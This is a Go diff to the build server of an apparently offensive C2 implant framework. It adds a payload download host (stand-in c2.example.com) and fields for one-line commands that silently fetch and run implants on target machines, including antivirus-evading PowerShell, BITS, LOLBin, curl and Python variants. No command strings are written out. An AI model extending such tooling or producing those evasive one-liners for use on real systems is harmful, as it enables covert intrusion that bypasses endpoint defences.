@@ -49,6 +49,10 @@ type BuildRequest struct {
 	OutputPath   string `json:"output_path"`
 	OS           string `json:"os"`
 	Arch         string `json:"arch"`
+	// DownloadHost 一键上线命令里的载荷下载地址（可选）：留空时服务端按
+	// 监听器 public_host → 控制台访问地址 → server_url 主机 → 本机内网 IP 逐级解析。
+	// 填 https://c2.example.com 这类完整地址可覆盖自动解析（CDN/反代场景）。
+	DownloadHost string `json:"download_host"`
 	// Evasion options
 	XOREncrypt   bool `json:"xor_encrypt"`
 	XORKeySize   int  `json:"xor_key_size"`
@@ -66,6 +70,15 @@ type BuildResponse struct {
 	DownloadURL string `json:"download_url"`
 	// OneLiner 一条命令上线：直接复制到目标机执行即可静默下载并运行载荷（仅 exe/raw 生效）
 	OneLiner string `json:"one_liner"`
+	// OneLinerHost 实际解析出的载荷下载主机（host[:port]），供 UI 明确展示
+	OneLinerHost string `json:"one_liner_host,omitempty"`
+	// OneLinerBase 一键上线命令使用的下载基址（如 https://c2.example.com）
+	OneLinerBase string `json:"one_liner_base,omitempty"`
+	// OneLinerWarning 非空表示下载地址可能对目标机不可达（回环/仅内网）
+	OneLinerWarning string `json:"one_liner_warning,omitempty"`
+	// OneLiners 多条免杀上线命令变体（PowerShell/BITS/LOLBin/curl/python...），
+	// 便于现场按终端拦截情况换用；OneLiner 为其首选项的兼容字段。
+	OneLiners []OneLiner `json:"one_liners,omitempty"`
 }
 
 type ImplantsInfo struct {
@@ -412,6 +425,7 @@ func (s *Server) setupRoutes() {
 	api.HandleFunc("/implants", s.listImplantsHandler).Methods("GET")
 	api.HandleFunc("/implants/download/{name}", s.downloadImplantHandler).Methods("GET")
 	api.HandleFunc("/implants/stored", s.listStoredImplantsHandler).Methods("GET")
+	api.HandleFunc("/implants/stored/{id}/oneliner", s.storedImplantOneLinerHandler).Methods("GET")
 	api.HandleFunc("/implants/stored/{id}", s.downloadStoredImplantHandler).Methods("GET")
 	api.HandleFunc("/implants/{id}", s.deleteStoredImplantHandler).Methods("DELETE")
 
